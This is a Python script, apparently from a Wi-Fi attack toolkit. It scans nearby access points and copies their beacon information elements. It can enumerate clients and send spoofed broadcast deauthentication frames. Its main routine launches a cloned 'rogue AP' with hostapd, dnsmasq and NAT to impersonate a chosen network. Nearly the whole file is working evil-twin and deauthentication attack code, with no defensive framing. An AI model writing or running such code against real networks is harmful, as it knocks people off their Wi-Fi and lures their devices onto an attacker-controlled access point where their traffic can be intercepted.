import subprocess
import threading
import time
from pathlib import Path

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, RadioTap
from ap_manager import start_ap


def _iface_exists(name: str) -> bool:
    if not name:
        return False
    try:
        proc = subprocess.run([
            "ip",
            "-o",
            "link",
            "show",
            name
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
        return proc.returncode == 0
    except Exception:
        return False


def _iface_mac(name: str) -> str:
    if not name:
        return ""
    try:
        path = Path(f"/sys/class/net/{name}/address")
        if path.exists():
            return path.read_text().strip().lower()
    except Exception:
        pass
    try:
        out = subprocess.check_output([
            "ip",
            "-o",
            "link",
            "show",
            name
        ], text=True, stderr=subprocess.DEVNULL)
        for part in out.split():
            if ':' in part and len(part) == 17 and part.count(':') == 5:
                return part.lower()
    except Exception:
        pass
    return ""

def start_monitor_mode(interface="wlan0"):
    print(f"Starting monitor mode on {interface}...")
    # Unblock the interface if it's blocked by rfkill
    try:
        print("Unblocking wireless interface with rfkill...")
        subprocess.run(["sudo", "rfkill", "unblock", "all"], check=False)
    except Exception as e:
        print(f"Warning: Could not unblock rfkill: {e}")
    
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
    subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
    print("Monitor mode started.")

def stop_monitor_mode(monitor_interface="wlan0mon"):
    """Stop monitor mode gracefully without assuming NetworkManager is running.

    - If the monitor interface doesn't exist (already stopped or renamed), this is a no-op.
    - Avoid failing when NetworkManager isn't installed/running; attempt restart softly.
    """
    def _iface_exists(name: str) -> bool:
        try:
            out = subprocess.run(["ip", "-o", "link", "show", name], stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL, check=False)
            return out.returncode == 0
        except Exception:
            return False

    # Accept either base or monitor name
    mon = monitor_interface if monitor_interface.endswith('mon') else (monitor_interface + 'mon')
    base = mon[:-3] if mon.endswith('mon') else mon

    print(f"Stopping monitor mode on {mon}...")
    if _iface_exists(mon):
        # Best-effort stop, don't error if airmon-ng returns non-zero
        subprocess.run(["sudo", "airmon-ng", "stop", mon], check=False,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        # Try to ensure base is in managed mode if it exists
        if _iface_exists(base):
            subprocess.run(["sudo", "ip", "link", "set", base, "down"], check=False,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iw", base, "set", "type", "managed"], check=False,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "link", "set", base, "up"], check=False,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Soft-try to restart NetworkManager only if present; ignore failures
    # Prefer systemctl if available
    try:
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=False,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        try:
            subprocess.run(["sudo", "service", "NetworkManager", "restart"], check=False,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
    print("Monitor mode stopped.")
def scan_aps(interface="wlan0mon", timeout=15, hop=True, channels=None, dwell=0.4, on_ap=None):
    """Scan for nearby APs and collect limited beacon metadata.

    Parameters:
      interface: monitor-mode interface name
      timeout: total scan duration seconds
      hop: whether to channel hop (2.4GHz default list) during scan
      channels: explicit list of channels to cycle (defaults to common 1-13 if None)
      dwell: seconds to stay on each channel
            on_ap: optional callable invoked with (bssid, info_dict) whenever a new AP is observed
    """
    aps = {}

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr3
            
            # Only process the first beacon from each BSSID to avoid
            # accumulating duplicate vendor IEs from multiple beacons
            if bssid in aps:
                return
            
            ssid = ''
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            except Exception:
                ssid = ''

            # Collect raw Information Elements (IEs) from the beacon so
            # we can reproduce them later. We also try to extract the
            # channel (DS Param IE, id=3) and beacon interval if present.
            # Use a set to track unique vendor IEs and avoid duplicates.
            vendor_ies = []
            seen_ies = set()
            elt = pkt.getlayer(Dot11Elt)
            channel = None
            while isinstance(elt, Dot11Elt):
                try:
                    # Only include Vendor Specific IEs (ID == 221 / 0xdd)
                    # for hostapd's vendor_elements. Feeding other IE types
                    # into vendor_elements causes hostapd to reject the
                    # configuration as seen in the error.
                    if getattr(elt, 'ID', None) == 221:
                        ie_bytes = bytes(elt)
                        if ie_bytes not in seen_ies:
                            seen_ies.add(ie_bytes)
                            vendor_ies.append(ie_bytes)
                except Exception:
                    # Fallback: construct vendor IE bytes if ID==221
                    try:
                        if getattr(elt, 'ID', None) == 221:
                            ie_bytes = bytes([elt.ID, elt.len]) + (elt.info or b'')
                            if ie_bytes not in seen_ies:
                                seen_ies.add(ie_bytes)
                                vendor_ies.append(ie_bytes)
                    except Exception:
                        pass

                try:
                    if getattr(elt, 'ID', None) == 3 and elt.info and len(elt.info) >= 1:
                        channel = elt.info[0]
                except Exception:
                    pass

                elt = elt.payload

            ies_hex = b''.join(vendor_ies).hex() if vendor_ies else None
            beacon_int = None
            try:
                beacon_layer = pkt.getlayer(Dot11Beacon)
                beacon_int = getattr(beacon_layer, 'beacon_interval', None)
            except Exception:
                beacon_int = None

            info = {
                'ssid': ssid,
                'ies_hex': ies_hex,
                'channel': channel,
                'beacon_int': beacon_int
            }
            aps[bssid] = info
            if callable(on_ap):
                try:
                    on_ap(bssid, dict(info))
                except Exception:
                    pass

    # Channel hopping (optional) to discover APs across channels
    stop_hop = None
    hopper_thread = None
    if hop:
        stop_hop = threading.Event()
        if channels is None:
            channels = list(range(1, 14))  # 2.4GHz 1-13; adjust for reg domain if needed

        def hopper():
            idx = 0
            while not stop_hop.is_set():
                ch = channels[idx % len(channels)]
                # Prefer modern iw command; fallback to iwconfig
                try:
                    subprocess.run(["sudo", "iw", "dev", interface, "set", "channel", str(ch)],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
                except Exception:
                    subprocess.run(["sudo", "iwconfig", interface, "channel", str(ch)],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
                time.sleep(dwell)
                idx += 1

        hopper_thread = threading.Thread(target=hopper, daemon=True)
        hopper_thread.start()

    print(f"Scanning for Access Points on {interface} for {timeout} seconds... (hopping={hop})")
    try:
        sniff(iface=interface, prn=packet_handler, timeout=timeout, store=0)
    finally:
        if stop_hop:
            stop_hop.set()
        if hopper_thread:
            hopper_thread.join(timeout=1)
    return aps

def scan_clients(ap_bssid, interface="wlan0mon", timeout=20, force_iface_bssid=False):
    """Return client MAC addresses observed talking to the given BSSID."""

    if not ap_bssid:
        raise ValueError("ap_bssid is required")

    clients = set()
    target_bssid = ap_bssid.lower()

    interface = (interface or "").strip()
    if not interface:
        raise ValueError("interface is required")
    base_iface = interface[:-3] if interface.endswith("mon") else interface

    candidates = []
    if interface:
        if interface.endswith("mon"):
            candidates.append(interface)
            if base_iface and base_iface != interface:
                candidates.append(base_iface)
        else:
            # Prefer monitor interface when caller passed the managed name.
            candidates.append(interface + "mon")
            candidates.append(interface)

    sniff_iface = None
    seen = set()
    for cand in candidates:
        if not cand or cand in seen:
            continue
        seen.add(cand)
        if _iface_exists(cand):
            sniff_iface = cand
            break

    if sniff_iface is None:
        tried = [c for c in candidates if c]
        raise RuntimeError(f"No usable interface found to scan (tried: {', '.join(tried)})")

    effective_base = sniff_iface[:-3] if sniff_iface.endswith("mon") else sniff_iface
    if force_iface_bssid:
        forced_bssid = _iface_mac(effective_base)
        if forced_bssid:
            target_bssid = forced_bssid.lower()

    print(f"Scanning for clients connected to AP {target_bssid} on {sniff_iface} for {timeout}s...")

    def _record(pkt):
        dot11 = pkt.getlayer(Dot11)
        if not dot11:
            return
        addresses = [
            getattr(dot11, "addr1", None),
            getattr(dot11, "addr2", None),
            getattr(dot11, "addr3", None),
            getattr(dot11, "addr4", None)
        ]
        lower_addrs = [addr.lower() for addr in addresses if addr]
        if target_bssid not in lower_addrs:
            return
        for addr in lower_addrs:
            if addr == target_bssid:
                continue
            if addr == "ff:ff:ff:ff:ff:ff":
                continue
            if len(addr) != 17:
                continue
            clients.add(addr)

    try:
        sniff(iface=sniff_iface, prn=_record, timeout=timeout, store=0)
    except Exception as exc:
        print(f"Warning: failed to sniff on {sniff_iface}: {exc}")

    base_mac = _iface_mac(effective_base)
    if base_mac and base_mac == target_bssid:
        # Pull associated stations from the kernel for locally hosted APs.
        try:
            out = subprocess.check_output([
                "iw",
                "dev",
                effective_base,
                "station",
                "dump"
            ], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                line = line.strip()
                if not line.lower().startswith("station"):
                    continue
                parts = line.split()
                if len(parts) >= 2:
                    mac = parts[1].lower()
                    if mac and mac != target_bssid and mac != "ff:ff:ff:ff:ff:ff":
                        clients.add(mac)
        except FileNotFoundError:
            pass
        except subprocess.CalledProcessError:
            pass

    return clients


def send_deauth(ap_bssid, interface="wlan0mon", reason=7, count=1):
    """Send IEEE 802.11 deauthentication frames to the target BSSID."""

    if not ap_bssid:
        raise ValueError("ap_bssid is required")
    interface = (interface or "").strip()
    if not interface:
        raise ValueError("interface is required")

    target_bssid = ap_bssid.strip().lower()
    if len(target_bssid) != 17 or target_bssid.count(":") != 5:
        raise ValueError(f"Invalid BSSID: {ap_bssid}")

    candidates = []
    if interface.endswith("mon"):
        candidates.append(interface)
        base_iface = interface[:-3]
        if base_iface:
            candidates.append(base_iface)
    else:
        candidates.append(interface + "mon")
        candidates.append(interface)

    send_iface = None
    seen = set()
    for cand in candidates:
        if not cand or cand in seen:
            continue
        seen.add(cand)
        if _iface_exists(cand):
            send_iface = cand
            break

    if send_iface is None:
        tried = [c for c in candidates if c]
        raise RuntimeError(f"No usable interface found to send deauth (tried: {', '.join(tried)})")

    frame = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)/Dot11Deauth(reason=reason)
    print(f"Sending {count} deauth frame(s) to {target_bssid} via {send_iface} (reason={reason})")
    sendp(frame, iface=send_iface, count=max(1, int(count)), inter=0.1, verbose=False)
    return send_iface

if __name__ == "__main__":
    print("============== Wi-Fi Access Point Scanner ==============")
    show_interfaces()

    interface = input("Enter your interface name (e.g., wlan0): ")
    upstream_iface = input("Enter your upstream interface name (e.g., eth0): ")
    monitor_interface = f"{interface}mon"

    try:
        start_monitor_mode(interface)
        aps = scan_aps(monitor_interface)
        print("\nAccess Points found:")
        for bssid, info in aps.items():
            ssid = info.get('ssid', '')
            ch = info.get('channel')
            print(f"BSSID: {bssid}, SSID: {ssid}, channel: {ch}")
    finally:
        stop_monitor_mode(monitor_interface)
            
    # Ask the user for which BSSID to clone (this preserves unique AP
    # beacon information). If the user prefers to input an SSID, they
    # can instead copy the BSSID printed above.
    selected_bssid = input("\nEnter the BSSID of the AP to clone (e.g. 12:34:56:78:9a:bc): ").strip().lower()
    if selected_bssid not in aps:
        print("BSSID not found in scan results; falling back to asking for SSID")
        selected_ssid = input("Enter the SSID of the AP to create a rogue AP: ")
        selected_bssid = None
    else:
        selected_ssid = aps[selected_bssid].get('ssid', '')

    passphrase = input("Enter the passphrase for the rogue AP: ")

    # Provide beacon customization to start_ap so hostapd will include
    # the original AP's IEs and settings in the rogue beacons.
    beacon_ies = None
    beacon_int = None
    if selected_bssid and selected_bssid in aps:
        beacon_ies = aps[selected_bssid].get('ies_hex')
        beacon_int = aps[selected_bssid].get('beacon_int')
        channel = aps[selected_bssid].get('channel') or 6
    else:
        channel = 6

    rogue_ap_manager = start_ap(interface, selected_ssid, passphrase,
                                "192.168.50.1/24", "192.168.50.10",
                                "192.168.50.100", channel, upstream_iface,
                                beacon_ies=beacon_ies, beacon_int=beacon_int)
    
    try:
        print('\nType "quit" or press Ctrl+C to stop the rogue AP and cleanup.')
        while True:
            try:
                line = input('> ').strip().lower()
            except EOFError:
                break
            except KeyboardInterrupt:
                print('\nInterrupted — stopping rogue AP...')
                break

            if line in ("quit", "exit", "stop"):
                break
            elif line == "status":
                # Quick status: check processes
                hs = 'running' if rogue_ap_manager._hostapd_proc and rogue_ap_manager._hostapd_proc.poll() is None else 'stopped'
                ds = 'running' if rogue_ap_manager._dnsmasq_proc and rogue_ap_manager._dnsmasq_proc.poll() is None else 'stopped'
                print(f"hostapd: {hs}, dnsmasq: {ds}, tmpdir: {rogue_ap_manager._tmpdir}, nat: {rogue_ap_manager._nat_enabled}")
            elif line == "logs":
                # Print a few hostapd stderr lines if available
                if rogue_ap_manager._hostapd_proc and rogue_ap_manager._hostapd_proc.stderr:
                    try:
                        rogue_ap_manager._hostapd_proc.stderr.flush()
                    except Exception:
                        pass
                    print("(hostapd stderr available; run journalctl -u hostapd for full logs)")
                else:
                    print("No hostapd process or no stderr available.")
            elif line == "help":
                print("Commands: status, logs, quit")
            else:
                print('Unknown command. Type "help" for commands or "quit" to exit.')
                
    finally:
        rogue_ap_manager.stop()
        
    # selected_bssid = input("\nEnter the BSSID of the AP to scan for clients: ")
    # clients = scan_clients(selected_bssid, monitor_interface)
    # print(f"\nClients connected to AP {selected_bssid}:")
    # for client in clients:
    #     print(f"Client MAC: {client}")
    